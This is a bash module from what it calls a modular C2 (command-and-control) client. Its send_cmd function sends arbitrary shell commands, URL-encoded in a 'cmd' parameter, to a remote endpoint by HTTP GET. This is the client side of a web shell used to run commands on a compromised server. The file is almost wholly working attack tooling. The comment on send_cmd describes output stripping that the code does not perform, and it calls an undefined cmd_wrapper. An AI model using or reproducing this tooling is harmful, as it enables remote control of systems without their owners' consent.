#!/usr/bin/env bash
# Lightweight shell module for the modular C2 client.

print_warn() {
  echo -e "${YELLOW}[!]${NC} $1" >&2
}

print_err() {
  echo -e "${RED}[!]${NC} $1" >&2
}
                                                                                        print_std() {
  echo -e "${GREEN}[+]${NC} $1"
}

print_help() {
  echo -e "${BLUE}$1${NC} $2"
}

print_out() {
  echo -e "${GREEN}[+]${YELLOW} $1${NC}"
}

# Initialize the module.
# Expects a URL as the first argument and returns error if not provided.
module_init() {
  # URL is provided as the first positional parameter; default to empty if missing
  URL="${1:-}"
  # If URL is empty, print an error message and return non-zero
  if [[ -z "$URL" ]]; then
    print_err "shell_module_init: URL must be provided"
    return 1
  fi
}

# send_cmd: send a shell command to the remote endpoint and extract its output.
# Parameters:
#   $1 - the shell command to execute remotely
# Behavior:
#   - wraps the command output with explicit markers (START / END)
#   - performs an HTTP GET using curl and URL-encodes the command
#   - strips everything before START and after END to return clean output
send_cmd() {
  local cmd=$(cmd_wrapper "$1")
  # Use curl to send a GET request with the URL-encoded 'cmd' parameter
  curl -s --get --data-urlencode "cmd=$cmd" "$URL"
}

# module_main: entry point when the module is executed.
# Currently a no-op placeholder so the framework can call it without error.
module_main() {
  :
}

# module_description: short description of the module for listing modules.
module_description() {
  echo "Lightweight command execution module using GET requests."
}

# show_module_help: prints usage information for this module.
show_module_help() {
  cat <<EOF
Usage: $0 simple_shell <URL>

Description:
  Sends shell commands via HTTP GET requests.

Arguments:
  URL    Target endpoint URL
EOF
}
